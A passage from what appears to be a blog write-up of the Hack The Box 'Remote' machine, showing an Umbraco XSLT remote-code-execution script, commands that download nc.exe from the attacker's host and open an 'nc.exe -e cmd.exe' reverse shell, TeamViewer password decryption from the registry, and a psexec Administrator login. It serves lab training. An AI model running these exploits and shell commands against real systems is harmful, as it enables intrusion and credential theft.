+"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">arguments</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">command</span><span class="p">)</span>
+
+<span class="n">login</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">user</span>
+<span class="n">password</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">password</span>
+<span class="n">host</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">url</span>
+
+<span class="c1"># Process Login
+</span><span class="n">url_login</span> <span class="o">=</span> <span class="n">host</span> <span class="o">+</span> <span class="s">"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin"</span>
+<span class="n">loginfo</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"username"</span><span class="p">:</span> <span class="n">login</span><span class="p">,</span> <span class="s">"password"</span><span class="p">:</span> <span class="n">password</span><span class="p">}</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
+
+<span class="c1"># START OF MODIFIED SECTION
+# r2 = s.post(url_login,json=loginfo)
+</span><span class="n">r2</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_login</span><span class="p">,</span><span class="n">json</span><span class="o">=</span><span class="n">loginfo</span><span class="p">)</span>
+<span class="n">cookie</span> <span class="o">=</span> <span class="n">SimpleCookie</span><span class="p">()</span>
+<span class="n">cookie</span><span class="p">.</span><span class="n">load</span><span class="p">(</span><span class="n">r2</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">"Set-Cookie"</span><span class="p">])</span>
+
+<span class="k">for</span> <span class="n">key</span><span class="p">,</span><span class="n">value</span> <span class="ow">in</span> <span class="n">cookie</span><span class="p">.</span><span class="n">items</span><span class="p">():</span>
+    <span class="n">cookie_obj</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="n">create_cookie</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="n">key</span><span class="p">,</span><span class="n">value</span><span class="o">=</span><span class="n">value</span><span class="p">.</span><span class="n">value</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="n">cookie_obj</span><span class="p">)</span>
+<span class="c1"># END OF MODIFIED SECTION
+</span>
+
+<span class="c1"># Go to vulnerable web page
+</span><span class="n">url_xslt</span> <span class="o">=</span> <span class="n">host</span> <span class="o">+</span> <span class="s">"/umbraco/developer/Xslt/xsltVisualize.aspx"</span>
+<span class="n">r3</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_xslt</span><span class="p">)</span>
+
+
+<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r3</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="s">'html.parser'</span><span class="p">)</span>
+<span class="n">VIEWSTATE</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="s">"__VIEWSTATE"</span><span class="p">)[</span><span class="s">'value'</span><span class="p">]</span>
+<span class="n">VIEWSTATEGENERATOR</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="s">"__VIEWSTATEGENERATOR"</span><span class="p">)[</span><span class="s">'value'</span><span class="p">]</span>
+<span class="n">UMBXSRFTOKEN</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">[</span><span class="s">'UMB-XSRF-TOKEN'</span><span class="p">]</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'UMB-XSRF-TOKEN'</span><span class="p">:</span> <span class="n">UMBXSRFTOKEN</span><span class="p">}</span>
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"__EVENTTARGET"</span><span class="p">:</span> <span class="s">""</span><span class="p">,</span> <span class="s">"__EVENTARGUMENT"</span><span class="p">:</span> <span class="s">""</span><span class="p">,</span> <span class="s">"__VIEWSTATE"</span><span class="p">:</span> <span class="n">VIEWSTATE</span><span class="p">,</span>
+    <span class="s">"__VIEWSTATEGENERATOR"</span><span class="p">:</span> <span class="n">VIEWSTATEGENERATOR</span><span class="p">,</span>
+    <span class="s">"ctl00$body$xsltSelection"</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
+    <span class="s">"ctl00$body$contentPicker$ContentIdValue"</span><span class="p">:</span> <span class="s">""</span><span class="p">,</span>
+    <span class="s">"ctl00$body$visualizeDo"</span><span class="p">:</span> <span class="s">"Visualize+XSLT"</span> <span class="p">}</span>
+
+<span class="c1"># Launch the attack
+</span><span class="n">r4</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_xslt</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+
+<span class="c1"># print(r4.text)
+# Filter output
+</span><span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r4</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="s">'html.parser'</span><span class="p">)</span>
+<span class="n">CMDOUTPUT</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="s">"result"</span><span class="p">).</span><span class="n">getText</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">CMDOUTPUT</span><span class="p">)</span>
+</pre></table></code></div></div><p>Now, lets test it out.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>python umbraco.py <span class="nt">-u</span> <span class="s1">'admin@htb.local'</span> <span class="nt">-p</span> <span class="s1">'baconandcheese'</span> <span class="nt">-i</span> http://remote.htb <span class="nt">-c</span> cmd.exe <span class="nt">-a</span> <span class="s2">"/c whoami"</span>
+iis apppool<span class="se">\d</span>efaultapppool
+
+</pre></table></code></div></div><p>With RCE on the box, we can now upload our <code class="language-plaintext highlighter-rouge">nc.exe</code> to it and establish a reverse shell.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>python umbraco.py <span class="nt">-u</span> <span class="s1">'admin@htb.local'</span> <span class="nt">-p</span> <span class="s1">'baconandcheese'</span> <span class="nt">-i</span> http://remote.htb <span class="nt">-c</span> cmd.exe <span class="nt">-a</span> <span class="s2">"/c mkdir C:</span><span class="se">\\\\</span><span class="s2">tmp"</span>
+
+<span class="nv">$ </span>python <span class="nt">-m</span> SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+
+<span class="nv">$ </span>python umbraco.py <span class="nt">-u</span> <span class="s1">'admin@htb.local'</span> <span class="nt">-p</span> <span class="s1">'baconandcheese'</span> <span class="nt">-i</span> http://remote.htb <span class="nt">-c</span> cmd.exe <span class="nt">-a</span> <span class="s2">"/c curl http://10.10.XX.XX/nc.exe &gt; C:</span><span class="se">\\\\</span><span class="s2">tmp</span><span class="se">\\\\</span><span class="s2">nc.exe"</span>
+
+<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1337
+istening on <span class="o">[</span>any] 1337 ...
+
+<span class="nv">$ </span>python umbraco.py <span class="nt">-u</span> <span class="s1">'admin@htb.local'</span> <span class="nt">-p</span> <span class="s1">'baconandcheese'</span> <span class="nt">-i</span> http://remote.htb <span class="nt">-c</span> cmd.exe <span class="nt">-a</span> <span class="s2">"/c C:</span><span class="se">\\\\</span><span class="s2">tmp</span><span class="se">\\\\</span><span class="s2">nc.exe -e cmd.exe 10.10.XX.XX 1337"</span>
+</pre></table></code></div></div><p>On our <code class="language-plaintext highlighter-rouge">nc</code> listener`, we catch our reverse shell.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>listening on [any] 1337 ...
+connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.180] 49708
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv&gt;whoami
+iis apppool\defaultapppool
+</pre></table></code></div></div><h1 id="usertxt">user.txt</h1><p>As the current user did not have a home directory, I had to resort to using <code class="language-plaintext highlighter-rouge">where</code> to find it.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>c:\windows\system32\inetsrv&gt; where /R C:\ user.txt
+C:\Users\Public\user.txt
+c:\windows\system32\inetsrv&gt; type C:\Users\Public\user.txt
+cf70XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+</pre></table></code></div></div><h1 id="enumeration-2">Enumeration (2)</h1><p>Lets check whats installed on the system.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+</pre><td class="rouge-code"><pre>c:\windows\system32\inetsrv&gt; dir "C:\Program Files"
+ Volume in drive C has no label.
+ Volume Serial Number is BE23-EB3E
+
+ Directory of C:\Program Files
+
+02/23/2020  03:19 PM    &lt;DIR&gt;          .
+02/23/2020  03:19 PM    &lt;DIR&gt;          ..
+02/19/2020  04:04 PM    &lt;DIR&gt;          Common Files
+09/15/2018  05:06 AM    &lt;DIR&gt;          internet explorer
+02/23/2020  03:16 PM    &lt;DIR&gt;          Microsoft SQL Server
+02/19/2020  04:11 PM    &lt;DIR&gt;          MSBuild
+02/19/2020  04:11 PM    &lt;DIR&gt;          Reference Assemblies
+02/19/2020  04:04 PM    &lt;DIR&gt;          VMware
+02/20/2020  07:46 AM    &lt;DIR&gt;          Windows Defender
+09/15/2018  05:05 AM    &lt;DIR&gt;          Windows Defender Advanced Threat Protection
+09/15/2018  03:19 AM    &lt;DIR&gt;          Windows Mail
+10/29/2018  06:39 PM    &lt;DIR&gt;          Windows Media Player
+09/15/2018  03:19 AM    &lt;DIR&gt;          Windows Multimedia Platform
+09/15/2018  03:28 AM    &lt;DIR&gt;          windows nt
+10/29/2018  06:39 PM    &lt;DIR&gt;          Windows Photo Viewer
+09/15/2018  03:19 AM    &lt;DIR&gt;          Windows Portable Devices
+09/15/2018  03:19 AM    &lt;DIR&gt;          Windows Security
+09/15/2018  03:19 AM    &lt;DIR&gt;          WindowsPowerShell
+               0 File(s)              0 bytes
+              18 Dir(s)  19,394,420,736 bytes free
+
+c:\windows\system32\inetsrv&gt; dir "C:\Program Files (x86)"
+ Volume in drive C has no label.
+ Volume Serial Number is BE23-EB3E
+
+ Directory of C:\Program Files (x86)
+
+02/23/2020  03:19 PM    &lt;DIR&gt;          .
+02/23/2020  03:19 PM    &lt;DIR&gt;          ..
+09/15/2018  03:28 AM    &lt;DIR&gt;          Common Files
+09/15/2018  05:06 AM    &lt;DIR&gt;          Internet Explorer
+02/23/2020  03:19 PM    &lt;DIR&gt;          Microsoft SQL Server
+02/23/2020  03:15 PM    &lt;DIR&gt;          Microsoft.NET
+02/19/2020  04:11 PM    &lt;DIR&gt;          MSBuild
+02/19/2020  04:11 PM    &lt;DIR&gt;          Reference Assemblies
+02/20/2020  03:14 AM    &lt;DIR&gt;          TeamViewer
+09/15/2018  05:05 AM    &lt;DIR&gt;          Windows Defender
+09/15/2018  03:19 AM    &lt;DIR&gt;          Windows Mail
+10/29/2018  06:39 PM    &lt;DIR&gt;          Windows Media Player
+09/15/2018  03:19 AM    &lt;DIR&gt;          Windows Multimedia Platform
+09/15/2018  03:28 AM    &lt;DIR&gt;          windows nt
+10/29/2018  06:39 PM    &lt;DIR&gt;          Windows Photo Viewer
+09/15/2018  03:19 AM    &lt;DIR&gt;          Windows Portable Devices
+09/15/2018  03:19 AM    &lt;DIR&gt;          WindowsPowerShell
+               0 File(s)              0 bytes
+              17 Dir(s)  19,394,396,160 bytes free
+</pre></table></code></div></div><p>“TeamViewer”? This definitely seem worth looking into. Maybe there are saved passwords? I couldn’t find any config files containing saved passwords so another location that stores configs is probably the registry.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>c:\windows\system32\inetsrv&gt; reg query HKLM /s /k /f "TeamViewer"
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\TeamViewer 7
+HKEY_LOCAL_MACHINE\SOFTWARE\TeamViewer
+HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TeamViewerConfiguration
+HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TeamViewerSession
+HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\TeamViewer7
+HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\TeamViewer7
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TeamViewer7
+End of search: 7 match(es) found
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\TeamViewer</code> seems promising so lets check that out.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>c:\windows\system32\inetsrv&gt; reg query "HKEY_LOCAL_MACHINE\SOFTWARE\TeamViewer" /s
+...
+HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7
+...
+    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
+...
+</pre></table></code></div></div><p>Seems like I was right! Using this script from this <a href="https://gist.github.com/rishdang/442d355180e5c69e0fcb73fecd05d7e0">link</a>, I was able to retrieve the decrypted password.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>python3 tv.py 
+
+This is a quick and dirty Teamviewer password decrypter basis wonderful post by @whynotsecurity.
+Read this blogpost <span class="k">if </span>you haven<span class="s1">'t already : https://whynotsecurity.com/blog/teamviewer
+ 
+Please check below mentioned registry values and enter its value manually without spaces.
+"SecurityPasswordAES" OR "OptionsPasswordAES" OR "SecurityPasswordExported" OR "PermanentPassword"
+
+Enter output from registry without spaces : FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
+Decrypted password is :  !R3m0te!
+</span></pre></table></code></div></div><h1 id="roottxt">root.txt</h1><p>With <code class="language-plaintext highlighter-rouge">!R3m0te!</code>, lets check if we can get into the <code class="language-plaintext highlighter-rouge">Administrator</code>’s account.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>python psexec.py <span class="s1">'Administrator:!R3m0te!@remote.htb'</span>
+Impacket v0.9.22.dev1+20200713.100928.1e84ad60 - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on remote.htb.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file FNFPcETB.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on remote.htb.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service xGXs on remote.htb.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service xGXs.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 10.0.17763.107]
+<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;type C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+baceXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+</pre></table></code></div></div><h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/nfs/" class="post-tag no-text-decoration" >nfs</a> <a href="/tags/umbraco/" class="post-tag no-text-decoration" >umbraco</a> <a href="/tags/teamviewer/" class="post-tag no-text-decoration" >teamviewer</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Remote - rizemon's blog&url=https://rizemon.github.io/posts/remote-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Remote - rizemon's blog&u=https://rizemon.github.io/posts/remote-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Remote - rizemon's blog&url=https://rizemon.github.io/posts/remote-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a><li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a><li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a><li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a><li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/bastion-htb/"><div class="card-body"> <span class="timeago small" > Sep 7, 2019 <i class="unloaded">2019-09-07T23:11:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Bastion</h3><div class="text-muted small"><p> I found this machine a little hard at first as this was my first Windows machine and I wasn’t adept at exploiting Windows. After reading various write ups and guides online, I was able to root this...</p></div></div></a></div><div class="card"> <a href="/posts/heist-htb/"><div class="card-body"> <span class="timeago small" > Dec 2, 2019 <i class="unloaded">2019-12-02T00:27:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Heist</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! $ ech...</p></div></div></a></div><div class="card"> <a href="/posts/json-htb/"><div class="card-body"> <span class="timeago small" > Feb 16, 2020 <i class="unloaded">2020-02-16T01:41:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Json</h3><div class="text-muted small"><p> Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mac...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/computingday2020-ctf/" class="btn btn-outline-primary"><p>NUS Computing Day 2020 CTF by NUS Greyhats</p></a> <a href="/posts/admirer-htb/" class="btn btn-outline-primary"><p>Hack The Box - Admirer</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
